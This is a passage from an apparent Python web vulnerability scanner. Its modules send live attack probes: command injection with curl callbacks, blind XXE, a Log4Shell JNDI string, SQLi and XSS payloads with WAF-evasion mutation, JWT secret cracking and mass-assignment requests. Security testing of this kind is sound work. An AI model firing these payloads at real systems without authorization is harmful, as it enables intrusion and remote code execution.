            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp)
            if r and SSTI_MARKER in r.text and payload not in r.text:
                job.add_vuln("Expression Language Injection", url, param=param, payload=payload,
                             evidence=f"EL/OGNL/SpEL evaluated {payload} -> {SSTI_MARKER} — RCE likely (Struts/Spring)")
                job.chain(f"EL injection on {param} -> expression evaluation -> remote code execution")
                return


# ── Module AP: XPath & LDAP Injection ─────────────────────────────────────────
def mod_xpath_ldap(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    if not params:
        return
    base = job.req(url)
    base_len = len(base.text) if base else 0
    for param in list(params)[:6]:
        for payload in XPATH_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp)
            if not r:
                continue
            low = r.text.lower()
            if any(re.search(e, low) for e in XPATH_ERRORS):
                job.add_vuln("XPath Injection", url, param=param, payload=payload,
                             evidence="XPath/XML parser error reflected — XPath injection")
                break
        for payload in LDAP_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r = job.req(url, params=tp)
            if not r:
                continue
            low = r.text.lower()
            if any(e in low for e in LDAP_ERRORS):
                job.add_vuln("LDAP Injection", url, param=param, payload=payload,
                             evidence="LDAP filter error reflected — LDAP injection")
                break


# ── Module AQ: Stored / Persistent XSS ────────────────────────────────────────
def mod_stored_xss(job):
    """Submit a unique benign marker through forms, then look for it un-encoded."""
    marker = STORED_XSS_MARKER
    probe  = f"<b id={marker}>x</b>"
    submitted = False
    for form in job.forms:
        if form["method"] != "POST":
            continue
        data = {}
        for name in form["inputs"]:
            ln = name.lower()
            if any(k in ln for k in ("csrf", "token", "captcha")):
                data[name] = ""
            elif "email" in ln:
                data[name] = f"{marker}@example.com"
            else:
                data[name] = probe
        if not data:
            continue
        job.req(form["action"], method="POST", data=data)
        submitted = True
    if not submitted:
        return
    # Re-crawl known pages and hunt for the raw, un-encoded marker
    pages = [job.url] + list(job.urls)[:30]
    for u in pages:
        r = job.req(u)
        if r and probe in r.text:
            job.add_vuln("Stored XSS", u, payload=probe,
                         evidence=f"Injected markup persisted un-encoded on {u} — persistent XSS")
            job.chain("Stored XSS -> payload runs for every visitor -> mass session theft")
            return
        if r and marker in r.text and ("&lt;" not in r.text.split(marker)[0][-6:]):
            job.add_vuln("Stored XSS", u, payload=marker,
                         evidence=f"Marker reflected on {u} without HTML-encoding — likely persistent XSS")
            return


# ── Module AR: Username Enumeration ───────────────────────────────────────────
def mod_user_enum(job):
    login_paths = ["/login", "/signin", "/api/login", "/auth/login", "/account/login",
                   "/forgot-password", "/password/reset", "/reset"]
    field_user = ["username", "user", "email", "login"]
    field_pass = ["password", "pass", "pwd"]
    for path in login_paths:
        target = job.url.rstrip("/") + path
        r0 = job.req(target)
        if not r0 or r0.status_code >= 400:
            continue
        # forge two attempts: clearly-fake user vs a plausible one
        def attempt(uname):
            data = {f: uname for f in field_user}
            data.update({f: "WrongPass!9123" for f in field_pass})
            rr = job.req(target, method="POST", data=data)
            return rr

        r_bad  = attempt("zzdoesnotexist_phantom9q")
        r_good = attempt("admin")
        if not (r_bad and r_good):
            continue
        diff_len  = abs(len(r_bad.text) - len(r_good.text))
        diff_code = r_bad.status_code != r_good.status_code
        signals   = ["no such user", "user not found", "unknown user", "no account",
                     "incorrect password", "wrong password", "invalid password"]
        bad_sig   = [s for s in signals if s in r_bad.text.lower()]
        good_sig  = [s for s in signals if s in r_good.text.lower()]
        if diff_code or diff_len > 120 or set(bad_sig) != set(good_sig):
            job.add_vuln("User Enumeration", target,
                         evidence=f"Login responses differ for valid vs invalid user (Δlen={diff_len}, codes {r_bad.status_code}/{r_good.status_code}) — usernames enumerable")
            return


# ── Module AS: Unrestricted File Upload (surface detection) ───────────────────
def mod_file_upload(job):
    r = job.req(job.url)
    forms_html = [r.text] if r else []
    for u in list(job.urls)[:20]:
        rr = job.req(u)
        if rr:
            forms_html.append(rr.text)
    for html in forms_html:
        for fm in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.S | re.I):
            block = fm.group(0)
            if re.search(r'type\s*=\s*["\']?file', block, re.I):
                restricted = bool(re.search(r'accept\s*=', block, re.I))
                act = re.search(r'action\s*=\s*["\']([^"\']+)', block, re.I)
                where = urljoin(job.url, act.group(1)) if act else job.url
                job.add_vuln("Unrestricted File Upload", where,
                             evidence="File-upload form found"
                                      + (" (no accept filter)" if not restricted else "")
                                      + " — verify server-side type/extension validation & webroot isolation")
                job.chain("File upload reachable -> if server-side validation is weak -> web shell -> RCE")
                return


# ── Module AT: Backup & Source-code disclosure ────────────────────────────────
def mod_backup_files(job):
    seeds = set()
    base = job.url.rstrip("/")
    for u in list(job.urls)[:25]:
        path = urlparse(u).path
        if path and path not in ("/", ""):
            seeds.add(path)
    seeds.update(["/index.php", "/index.html", "/config.php", "/app.py", "/main.py",
                  "/wp-config.php", "/web.config", "/settings.py", "/.env"])
    candidates = []
    for p in list(seeds)[:25]:
        for ext in BACKUP_EXTS:
            candidates.append(base + p + ext)
        candidates.append(base + p + ".save")
    for ext in SOURCE_EXTS:
        candidates.append(base + "/index" + ext)

    def probe(u):
        r = job.req(u, allow_redirects=False)
        if r and r.status_code == 200 and len(r.text) > 0:
            low = r.text.lower()
            looks_code = any(s in low for s in ["<?php", "import ", "def ", "function ",
                             "password", "secret", "connectionstring", "<configuration"])
            return u, looks_code, len(r.text)
        return None

    found = 0
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for fut in as_completed([ex.submit(probe, u) for u in candidates[:120]]):
            res = fut.result()
            if not res:
                continue
            u, looks_code, ln = res
            vt = "Source Code Disclosure" if (looks_code and any(u.endswith(e) for e in SOURCE_EXTS)) \
                 else "Backup File Exposed"
            job.add_vuln(vt, u,
                         evidence=f"HTTP 200 — {ln}B of "
                                  + ("source code/config" if looks_code else "backup content")
                                  + " accessible")
            if looks_code:
                job.chain(f"Backup/source disclosure at {u} -> read logic & embedded credentials")
            found += 1
            if found >= 6:
                return


# ── Module AU: Web Cache Deception ────────────────────────────────────────────
def mod_web_cache_deception(job):
    paths = ["/account", "/profile", "/settings", "/dashboard", "/my-account", "/user"]
    for p in paths:
        real = job.url.rstrip("/") + p
        r0 = job.req(real, allow_redirects=False)
        if not r0 or r0.status_code not in (200, 301, 302):
            continue
        for fake in [p + "/phantom.css", p + "/phantom.js", p + ".css"]:
            tricked = job.url.rstrip("/") + fake
            r = job.req(tricked, allow_redirects=False)
            if not r:
                continue
            cc  = r.headers.get("Cache-Control", "").lower()
            xc  = (r.headers.get("X-Cache", "") + r.headers.get("CF-Cache-Status", "")).lower()
            cacheable = ("no-store" not in cc and "private" not in cc) or "hit" in xc
            if r.status_code == 200 and cacheable and len(r.text) > 200:
                job.add_vuln("Web Cache Deception", tricked,
                             evidence=f"Static-looking URL returns dynamic page and is cacheable (CC='{cc or 'none'}', X-Cache='{xc or 'none'}') — cache deception")
                return


# ── Module AV: JWT attacks (alg:none + weak HMAC secret crack) ─────────────────
def mod_jwt_attacks(job):
    jwt_re = r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
    tokens = set()
    for u in [job.url] + list(job.urls)[:10]:
        r = job.req(u)
        if not r:
            continue
        blob = r.text + str(dict(r.headers)) + str(r.cookies.get_dict())
        tokens.update(re.findall(jwt_re, blob))
    for tok in list(tokens)[:5]:
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        try:
            hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        except Exception:
            continue
        alg = str(hdr.get("alg", "")).upper()
        if alg == "NONE":
            job.add_vuln("Weak JWT Secret", job.url, payload=tok[:32] + "...",
                         evidence="JWT uses alg:none — signature not verified, tokens fully forgeable")
            continue
        if alg.startswith("HS"):
            signing_input = (parts[0] + "." + parts[1]).encode()
            try:
                sig = base64.urlsafe_b64decode(parts[2] + "==")
            except Exception:
                continue
            digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                      "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
            for secret in WEAK_JWT_SECRETS:
                calc = hmac.new(secret.encode(), signing_input, digest).digest()
                if hmac.compare_digest(calc, sig):
                    job.add_vuln("Weak JWT Secret", job.url, payload=f"secret='{secret}'",
                                 evidence=f"JWT HMAC secret cracked: '{secret}' — forge any token / privilege escalation",
                                 extracted={"algorithm": alg, "cracked_secret": secret})
                    job.chain(f"Weak JWT secret '{secret}' -> forge admin token -> full account takeover")
                    break


# ── Module AW: Hidden parameter mining ────────────────────────────────────────
def mod_param_mining(job, url):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    base = job.req(url)
    if not base:
        return
    base_len = len(base.text)
    canary = "phantomCanary42"
    for hp in HIDDEN_PARAMS:
        if hp in params:
            continue
        tp = params.copy(); tp[hp] = canary
        r = job.req(url, params=tp)
        if not r:
            continue
        # reflected canary => the app reads this undocumented parameter
        if canary in r.text:
            job.add_vuln("Hidden Parameter", url, param=hp, payload=canary,
                         evidence=f"Undocumented parameter '{hp}' is reflected — hidden/debug feature reachable")
            return
        # large behavioural change for a sensitive switch
        if hp in ("debug", "admin", "test", "source") and abs(len(r.text) - base_len) > 400:
            job.add_vuln("Hidden Parameter", url, param=hp, payload=canary,
                         evidence=f"Parameter '{hp}' changed the response materially (Δ{abs(len(r.text)-base_len)}B) — hidden mode")
            return


# ── Module AX: Forced browsing / access-control bypass ────────────────────────
def mod_forced_browse(job):
    protected = ["/admin", "/admin/dashboard", "/administrator", "/manage", "/management",
                 "/api/admin", "/api/users", "/api/v1/users", "/internal", "/private",
                 "/config", "/settings/admin", "/dashboard", "/users", "/debug", "/metrics",
                 "/actuator", "/.git/", "/backup/"]
    GATE = ["login", "sign in", "unauthorized", "forbidden", "authentication required",
            "please log in", "access denied"]

    def probe(p):
        u = job.url.rstrip("/") + p
        r = job.req(u, allow_redirects=False)
        if not r:
            return None
        if r.status_code == 200:
            low = r.text.lower()
            # 200 but NOT a login/redirect gate => content served without auth
            if not any(g in low for g in GATE) and len(r.text) > 150:
                hint = "admin/management content" if any(k in p for k in ("admin", "manage", "user")) else "restricted area"
                return u, f"HTTP 200 with no auth gate — {hint} served without authentication"
        return None

    seen = 0
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for fut in as_completed([ex.submit(probe, p) for p in protected]):
            res = fut.result()
            if res:
                u, ev = res
                job.add_vuln("Forced Browsing", u, evidence=ev)
                job.chain(f"Forced browsing reaches {u} without auth -> access-control bypass")
                seen += 1
                if seen >= 4:
                    return


# ── Module AY: Verbose error / stack-trace disclosure ─────────────────────────
def mod_verbose_errors(job, url):
    TRACES = {
        "Python/Django": ["traceback (most recent call last)", "django.core.exceptions",
                          "werkzeug.exceptions", "file \"/", "line ", "raise "],
        "Java/Spring":   ["java.lang.", "org.springframework", "javax.servlet",
                          "at com.", "nested exception", ".java:"],
        "PHP":           ["fatal error:", "warning:", "notice:", "stack trace:", "on line",
                          "call stack", "xdebug"],
        "Node.js":       ["at object.<anonymous>", "node_modules", "/server.js:", "referenceerror",
                          "typeerror:", "at module."],
        "ASP.NET":       ["server error in", "system.web", "stack trace:", "[exception"],
        "Ruby/Rails":    ["actioncontroller", "activerecord::", ".rb:", "rails.application"],
    }
    # Send malformed input designed to trip a server-side error
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    test_urls = [url + ("&" if parsed.query else "?") + "phantom[]=1&id='\"\\`%00"]
    if params:
        bad = params.copy()
        for k in list(bad)[:2]:
            bad[k] = "'\"\\<phantom>%00"
        test_urls.append(urljoin(url, parsed.path) + "?" + urlencode(bad))
    test_urls.append(job.url.rstrip("/") + "/phantom_err_%2e%2e%2f%00")
    for tu in test_urls:
        r = job.req(tu)
        if not r:
            continue
        low = r.text.lower()
        for stack, sigs in TRACES.items():
            hits = [s for s in sigs if s in low]
            if len(hits) >= 2:
                job.add_vuln("Verbose Error Disclosure", tu,
                             evidence=f"{stack} stack trace leaked (markers: {hits[:3]}) — framework/paths exposed")
                if stack not in job.tech_stack:
                    job.tech_stack.append(stack)
                return


# ══ ROUND-3 ADVANCED ENGINES ═════════════════════════════════════════════════

def _dedup_urls(urls):
    """Collapse URLs that share the same path + parameter *shape* so we don't
    re-test 100 identical templates. This is the single biggest speed win."""
    seen = set(); out = []
    for u in urls:
        p = urlparse(u)
        sig = (p.path, tuple(sorted(dict(parse_qsl(p.query)).keys())))
        if sig in seen:
            continue
        seen.add(sig); out.append(u)
    return out


# ── Engine 1: Out-of-Band injection (self-hosted collector) ───────────────────
def mod_oob_inject(job):
    """Plant blind SSRF/RCE/XXE payloads that call back to our own /oob endpoint."""
    if not OOB_BASE:
        job.log("OOB engine: set OOB_URL or deploy on Render (RENDER_EXTERNAL_URL) to capture call-backs", "WARN")
        return
    tok = job.oob_token
    job.log(f"OOB engine: planting payloads -> {OOB_BASE}/oob/{tok[:10]}...", "INFO")
    targets = _dedup_urls(list(job.urls) or [job.url])[:12]
    for url in targets:
        if job.over_budget():
            break
        params = dict(parse_qsl(urlparse(url).query))
        for p in list(params)[:MAX_PARAM]:
            tp = params.copy(); tp[p] = oob_url(tok, f"ssrf-{p}")
            job.req(url, params=tp)
            host = oob_host(tok, f"rce-{p}")
            for sep in (";", "|", "&&", "$("):
                rce = params.copy(); rce[p] = f"{params[p]}{sep}curl http://{host}"
                job.req(url, params=rce)
    # blind SSRF via trusted headers
    for h in ("Referer", "X-Forwarded-For", "X-Api-Url", "True-Client-IP",
              "X-Forwarded-Host", "X-Original-URL", "CF-Connecting-IP"):
        job.req(job.url, headers={h: oob_url(tok, f"hdr-{h}")})
    # blind XXE
    xxe = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{oob_url(tok,"xxe")}">]><r>&x;</r>'
    for ct in ("application/xml", "text/xml"):
        job.req(job.url, method="POST", data=xxe, headers={"Content-Type": ct})
    # Log4Shell JNDI (best-effort — caught if the resolver fetches over HTTP)
    job.req(job.url, headers={"User-Agent": "${jndi:ldap://" + oob_host(tok, "jndi") + "}"})


def oob_collect(job):
    """Inspect captured call-backs and raise confirmed blind findings."""
    hits = oob_hits(job.oob_token)
    job.oob_events = hits
    if not hits:
        if OOB_BASE:
            job.log("OOB engine: no out-of-band interactions observed (target likely egress-filtered)", "OK")
        return
    job.log(f"OOB engine: {len(hits)} call-back(s) received — confirming blind vulns", "VULN")
    seen = set()
    for h in hits:
        ctx = h.get("ctx", "")
        key = ctx.split("-")[0]
        if key in seen:
            continue
        seen.add(key)
        ip = h.get("ip", "?")
        if key == "rce":
            job.add_vuln("Out-of-Band RCE", job.url, payload=ctx,
                         evidence=f"Injected command produced a call-back from {ip} — confirmed blind RCE")
            job.chain("OOB RCE confirmed -> attacker-controlled command ran on the server -> full compromise")
        elif key == "xxe":
            job.add_vuln("Blind XXE (OOB)", job.url, payload=ctx,
                         evidence=f"XML parser resolved our external entity (call-back from {ip}) — blind XXE")
        elif key == "jndi":
            job.add_vuln("Out-of-Band RCE", job.url, payload="log4shell",
                         evidence=f"JNDI lookup call-back from {ip} — Log4Shell-class RCE confirmed")
        else:
            job.add_vuln("Blind SSRF (OOB)", job.url, payload=ctx,
                         evidence=f"Server fetched our OOB URL (call-back from {ip}, ctx={ctx}) — blind SSRF confirmed")


# ── Engine 2: RL adaptive payload mutation ────────────────────────────────────
def mod_adaptive_fuzz(job, url):
    """Reinforcement-learning fuzzing: the bandit learns which mutation slips
    past filters/WAF on THIS target, then exploits it."""
    params = dict(parse_qsl(urlparse(url).query))
    if not params:
        return
    base = job.req(url)
    if not base:
        return
    bases = {"xss": "<script>alert(1)</script>", "sqli": "' OR 1=1-- -"}
    rounds = 6 if FAST else 14
    for p in list(params)[:MAX_PARAM]:
        for _ in range(rounds):
            if job.over_budget():
                return
            cls = random.choice(["xss", "sqli"])
            strat, mutated = job.mutator.mutate(bases[cls])
            tp = params.copy(); tp[p] = mutated
            r = job.req(url, params=tp)
            if not r:
                job.mutator.reward(strat, -0.5); continue
            if r.status_code in (403, 406, 429, 503):
                job.mutator.reward(strat, -1.0)              # WAF blocked it
                continue
            reward = 0.3                                     # got through the filter
            low = r.text.lower()
            if cls == "xss" and ("alert(1)" in r.text or "<script>alert" in low):
                job.add_vuln("Reflected XSS", url, param=p, payload=mutated,
                             evidence=f"Adaptive RL mutation '{strat}' reflected unsanitised — XSS bypass")
                job.mutator.reward(strat, 1.0); return
            if cls == "sqli" and any(re.search(e, low) for e in SQL_ERRORS):
                job.add_vuln("SQL Injection", url, param=p, payload=mutated,
                             evidence=f"Adaptive RL mutation '{strat}' triggered a SQL error — injection")
                job.mutator.reward(strat, 1.0); return
            job.mutator.reward(strat, reward)


# ── Engine 3: Stateful business-logic sequences ───────────────────────────────
def mod_stateful_logic(job):
    """Drives multi-step flows with a persistent session to find sequence abuse."""
    s = requests.Session(); s.verify = False
    s.headers.update({"User-Agent": UAS[0]})
    base = job.url.rstrip("/")

    def sget(u, **kw):
        try: return s.get(u, timeout=TIMEOUT, **kw)
        except Exception: return None
    def spost(u, data):
        try: return s.post(u, data=data, timeout=TIMEOUT)
        except Exception: return None

    # 1) Sequence/step bypass — jump straight to a 'final step' page
    later_steps = ["/checkout/success", "/order/confirm", "/payment/success", "/cart/checkout",
                   "/order/complete", "/thank-you", "/account/verified", "/confirm",
                   "/download/success", "/api/order/confirm", "/success"]
    OK = ["success", "confirmed", "thank you", "order #", "complete", "paid", "verified", "congratulations"]
    for p in later_steps:
        if job.over_budget(): break
        r = sget(base + p, allow_redirects=False)
        if r and r.status_code == 200 and any(k in r.text.lower() for k in OK):
            job.add_vuln("Stateful Logic Flaw", base + p,
                         evidence="Final-step page reachable directly without completing the prior steps — sequence bypass")
            job.chain("Stateful bypass -> skip payment/verification step -> obtain goods/access for free")
            break

    # 2) Coupon / discount replay (idempotency abuse)
    for form in job.forms:
        names = " ".join(form["inputs"]).lower()
        if any(k in names for k in ("coupon", "promo", "discount", "voucher", "gift", "redeem")):
            data = {n: "TEST10" for n in form["inputs"]}
            r1 = spost(form["action"], data); r2 = spost(form["action"], data)
            if r1 and r2 and r1.status_code == 200 == r2.status_code and "invalid" not in r2.text.lower():
                job.add_vuln("Stateful Logic Flaw", form["action"],
                             evidence="Coupon/discount still accepted on repeat submission — replay / stacking")
            break

    # 3) Negative / overflow quantity in cart-style forms
    for form in job.forms:
        names = [n.lower() for n in form["inputs"]]
        if any(k in n for n in names for k in ("qty", "quantity", "amount", "count")):
            for bad in ("-1", "0", "999999999"):
                data = {}
                for n in form["inputs"]:
                    data[n] = bad if any(k in n.lower() for k in ("qty","quantity","amount","count")) else "1"
                r = spost(form["action"], data)
                if r and r.status_code == 200 and "invalid" not in r.text.lower() and "error" not in r.text.lower():
                    job.add_vuln("Stateful Logic Flaw", form["action"], payload=f"qty={bad}",
                                 evidence=f"Cart accepted quantity={bad} without validation — price/stock manipulation")
                    return
            break


# ── Engine 4: API & mobile-backend fuzzing ────────────────────────────────────
def mod_api_fuzz(job):
    bases  = ["/api", "/api/v1", "/api/v2", "/rest", "/v1", "/v2",
              "/mobile/api", "/app/api", "/api/mobile", "/graphql"]
    common = ["/users", "/user", "/me", "/account", "/orders", "/products",
              "/admin", "/config", "/profile", "/login", "/customers"]
    found = []
    for b in bases:
        if job.over_budget(): break
        r = job.req(job.url.rstrip("/") + b)
        if r and ("json" in r.headers.get("Content-Type", "").lower()
                  or (r.text[:1] in "[{" and r.status_code < 500)):
            found.append(b)
    job.api_info = {"bases": found}
    if found:
        job.log(f"API surface detected: {found}", "OK")

    test_eps = []
    for b in (found or ["/api", "/api/v1"]):
        for e in common:
            test_eps.append(job.url.rstrip("/") + b + e)

    seen = 0
    SENS = ['"password"', '"passwd"', '"token"', '"secret"', '"ssn"', '"credit',
            '"apikey"', '"api_key"', '"private_key"', '"cvv"']
    for ep in test_eps[:24]:
        if job.over_budget(): break
        r = job.req(ep)
        if not r:
            continue
        ct = r.headers.get("Content-Type", "").lower()
        if "json" not in ct and r.text[:1] not in "[{":
            continue
        low = r.text.lower()
        if any(k in low for k in SENS):
            job.add_vuln("Excessive Data Exposure", ep,
                         evidence="API JSON response leaks sensitive fields (password/token/secret/cvv)")
            seen += 1
        elif r.status_code == 200 and len(r.text) > 40 and any(k in ep for k in ("user", "order", "account", "admin", "me", "customer")):
            job.add_vuln("API Misconfiguration", ep,
                         evidence=f"API returns data without authentication (HTTP 200, {len(r.text)}B) — broken access control")
            seen += 1
        if seen >= 4:
            break

    # HTTP method override smuggling
    r = job.req(job.url, method="POST", headers={"X-HTTP-Method-Override": "DELETE"})
    if r and r.status_code in (200, 202, 204):
        job.add_vuln("HTTP Method Override", job.url,
                     evidence="X-HTTP-Method-Override: DELETE accepted on a POST — verb smuggling")

    # Mass assignment (inject protected fields in JSON body)
    for ep in test_eps[:6]:
        if job.over_budget(): break
        try:
            r = job.req(ep, method="POST",
                        json={"role": "admin", "is_admin": True, "phantom_probe": "1"},
                        headers={"Content-Type": "application/json"})
        except Exception:
            r = None
        if r and r.status_code in (200, 201) and ("\"admin\"" in r.text.lower() or "is_admin" in r.text.lower()):
            job.add_vuln("Mass Assignment", ep,
                         evidence="API echoed back attacker-supplied role/is_admin — mass assignment / privilege escalation")
            break


# ── Engine 5: Headless browser dynamic DOM analysis ───────────────────────────
def mod_headless_dom(job):
    """Render the page in real Chromium to catch client-side-only routes, SPA
    links and DOM XSS that static analysis misses. Degrades gracefully."""
    if not PW_OK:
        job.log("Headless DOM: Playwright unavailable — relying on static DOM analysis", "INFO")
        return
    fired = {"xss": False}
    api_urls = set(); new_links = set()
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True,
                                         args=["--no-sandbox", "--disable-dev-shm-usage"])
            page = browser.new_page(ignore_https_errors=True)
            page.on("dialog", lambda d: (fired.__setitem__("xss", True), d.dismiss()))
            page.on("request", lambda req: api_urls.add(req.url)
                    if any(k in req.url for k in ("/api", "/graphql", ".json")) else None)
            try:
                page.goto(job.url, timeout=15000, wait_until="networkidle")
            except Exception:
                page.goto(job.url, timeout=15000)
            # harvest client-side rendered links (SPA)
            for href in page.eval_on_selector_all("a[href]",
                    "els => els.map(e => e.href)") or []:
                if job.host in href:
                    new_links.add(href.split("#")[0])
            # active DOM-XSS probe via hash sink
            try:
                page.goto(job.url + '#"><img src=x onerror=alert(1)>', timeout=8000)
                page.wait_for_timeout(800)
            except Exception:
                pass
            browser.close()
    except Exception as e:
        job.log(f"Headless DOM: browser unavailable ({str(e)[:40]}) — skipped", "INFO")
        return

    added = 0
    for l in new_links:
        if l not in job.urls and added < 30:
            job.urls.add(l); added += 1
    if added:
        job.log(f"Headless DOM: discovered {added} client-side rendered route(s)", "OK")
    if api_urls:
        job.api_info.setdefault("xhr_endpoints", list(api_urls)[:15])
    if fired["xss"]:
        job.add_vuln("DOM XSS", job.url, payload='#"><img src=x onerror=alert(1)>',
                     evidence="Headless Chromium executed an injected DOM payload (alert fired) — confirmed DOM XSS")
        job.chain("Confirmed DOM XSS in real browser -> session/credential theft for every visitor")


# ══ ROUND-4: CODE-LEVEL ANALYSIS, REVERSE ENGINEERING & EXPLOIT/POC ══════════

def _snippet(text, idx, span=120):
    """Return a readable code window around position idx with the spot marked."""
    start = max(0, idx - span); end = min(len(text), idx + span)
    line_no = text[:idx].count("\n") + 1
    chunk = text[start:end].strip()
    chunk = re.sub(r"\s+", " ", chunk)[:300]
    return f"L{line_no}: ...{chunk}..."

# Dangerous source patterns we flag in the site's OWN code (client-side review)
CODE_PATTERNS = [
    (r"\.innerHTML\s*=", "Vulnerable Code Pattern", "DOM-XSS sink: assigning to innerHTML with untrusted data"),
    (r"document\.write(?:ln)?\s*\(", "Vulnerable Code Pattern", "DOM-XSS sink: document.write()"),
    (r"\beval\s*\(", "Vulnerable Code Pattern", "Code-execution sink: eval()"),
    (r"new\s+Function\s*\(", "Vulnerable Code Pattern", "Code-execution sink: new Function()"),
    (r"dangerouslySetInnerHTML", "Vulnerable Code Pattern", "React XSS sink: dangerouslySetInnerHTML"),
    (r"\.insertAdjacentHTML\s*\(", "Vulnerable Code Pattern", "DOM-XSS sink: insertAdjacentHTML()"),
    (r"setTimeout\s*\(\s*[\"'`]", "Vulnerable Code Pattern", "eval-like setTimeout() called with a string"),
    (r"location\s*\.\s*(?:href|hash|search)\s*=", "Vulnerable Code Pattern", "DOM open-redirect: writing to location.*"),
    (r"\.postMessage\s*\([^)]*,\s*[\"']\*[\"']", "Vulnerable Code Pattern", "postMessage() with wildcard '*' target origin"),
    (r"(?i)(api[_-]?key|apikey|secret|passwd|password|access[_-]?token)\s*[:=]\s*[\"'][^\"']{8,}", "API Key Exposed", "Hard-coded credential in client-side code"),
    (r"localStorage\s*\.\s*setItem\s*\(\s*[\"'](?:token|jwt|auth|password|secret)", "Vulnerable Code Pattern", "Sensitive data persisted in localStorage"),
    (r"(?i)\b(md5|sha1)\s*\(", "Vulnerable Code Pattern", "Weak hash (MD5/SHA1) used in client code"),
    (r"http://[A-Za-z0-9.\-]+", "Vulnerable Code Pattern", "Hard-coded insecure http:// endpoint (MITM / mixed content)"),
]

# ── Form Hypotheses (code-pattern analysis) — Engine 6 ────────────────────────
def mod_code_audit(job):
    """Reviews the site's OWN HTML/JS source for dangerous code and pinpoints the
    exact line ('kaha issue hai'). Backs the 'Form Hypotheses' capability."""
    sources = []
    r = job.req(job.url)
    if r:
        sources.append(("inline HTML/JS", job.url, r.text))
        for m in re.finditer(r"<script[^>]*>(.*?)</script>", r.text, re.S | re.I):
            if m.group(1).strip():
                sources.append(("inline <script>", job.url, m.group(1)))
    for js in list(job.js_files)[:12]:
        if job.over_budget():
            break
        rj = job.req(js)
        if rj and rj.text:
            sources.append(("external JS", js, rj.text))

    seen = set(); hits = 0
    for label, where, text in sources:
        low_ok = text
        for pat, vtype, desc in CODE_PATTERNS:
            m = re.search(pat, low_ok)
            if not m:
                continue
            key = (vtype, desc, where)
            if key in seen:
                continue
            seen.add(key)
            snip = _snippet(text, m.start())
            # avoid flagging http:// to common analytics/CDNs as critical noise
            job.add_vuln(vtype, where,
                         evidence=f"{desc} (in {label})",
                         code=snip)
            hits += 1
            if hits >= 25:
                job.log("Code audit: pattern cap reached", "INFO")
                return
    job.log(f"Code audit: reviewed {len(sources)} source unit(s), {hits} risky pattern(s) located", "OK")


# ── Reverse Engineer — Engine 7 ───────────────────────────────────────────────
RE_BIN_MARKERS = [
    (rb"/bin/sh", "embeds /bin/sh — possible command execution"),
    (rb"system\(", "calls system() — command execution risk"),
    (rb"strcpy\(|gets\(|sprintf\(", "unsafe C function — buffer-overflow risk"),
    (rb"-----BEGIN [A-Z ]*PRIVATE KEY-----", "embedded private key"),
    (rb"AKIA[0-9A-Z]{16}", "embedded AWS access key"),
    (rb"password|passwd|secret", "embedded credential keyword"),
    (rb"https?://[A-Za-z0-9.\-/]+", "hard-coded URL / C2-style endpoint"),
]
RE_EXTS = (".js", ".mjs", ".map", ".wasm", ".apk", ".jar", ".exe", ".dll",
           ".bin", ".so", ".ipa", ".class", ".pyc", ".firmware")

def _strings(data, minlen=5):
    out = []; cur = bytearray()
    for b in data:
        if 32 <= b < 127:
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode("latin-1"))
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode("latin-1"))
    return out

def mod_reverse_engineer(job):
    """Static reverse engineering of shipped artifacts (JS bundles, wasm, apk,
    jar, exe...). Extracts strings, secrets and dangerous calls."""
    candidates = set()
    for u in list(job.urls) + list(job.js_files):
        if any(urlparse(u).path.lower().endswith(e) for e in RE_EXTS):
            candidates.add(u)
    # also probe a couple of common bundle/source-map locations
    for p in ["/static/js/main.js", "/assets/index.js", "/bundle.js", "/app.js", "/main.js.map"]:
        candidates.add(job.url.rstrip("/") + p)

    analysed = 0
    for u in list(candidates)[:12]:
        if job.over_budget():
            break
        try:
            rr = requests.get(u, timeout=TIMEOUT, verify=False,
                              headers={"User-Agent": UAS[0]}, stream=True)
            data = rr.raw.read(800_000, decode_content=True) or b""
        except Exception:
            continue
        if not data or rr.status_code != 200:
            continue
        analysed += 1
        # source map => original source disclosure
        if u.endswith(".map") or b'"sources"' in data[:2000]:
            job.add_vuln("Source Code Disclosure", u,
                         evidence="JavaScript source map exposed — original (pre-minified) source recoverable",
                         code=_snippet(data[:1500].decode("latin-1", "ignore"), 0))
        # secret scan over extracted strings
        text = "\n".join(_strings(data))[:200000]
        for kt, pattern in JS_SECRETS.items():
            m = re.search(pattern, text)
            if m:
                job.add_vuln("API Key Exposed", u,
                             evidence=f"Reverse-engineered artifact embeds {kt}",
                             code=_snippet(text, m.start()))
                break
        # dangerous binary/code markers
        for pat, desc in RE_BIN_MARKERS:
            m = re.search(pat, data)
            if m:
                vt = "Dangerous Binary Pattern" if not u.endswith((".js", ".mjs", ".map")) \
                     else "Vulnerable Code Pattern"
                job.add_vuln(vt, u, evidence=f"Static RE: {desc}",
                             code=_snippet(data.decode("latin-1", "ignore"), m.start()))
                break
    job.log(f"Reverse engineer: statically analysed {analysed} artifact(s)", "OK")


# ── Generate Exploits / PoC — Engine 8 ────────────────────────────────────────
def _cve_refs(job):
    refs = []
    blob = " ".join(job.tech_stack) + " " + " ".join(
        v.get("evidence", "") for v in job.vulns)
    for m in re.finditer(r"CVE-\d{4}-\d{4,7}", blob):
        if m.group(0) not in refs:
            refs.append(m.group(0))
    return refs

def generate_poc(job):
    """Builds a safe, reproduction-only Proof-of-Concept for each confirmed
    finding (the exact request that demonstrates it) plus CVE references.
    For remediation & verification — not weaponised tooling."""
    job.log("Exploit/PoC engine: generating reproduction steps for findings...", "INFO")
    cves = _cve_refs(job)
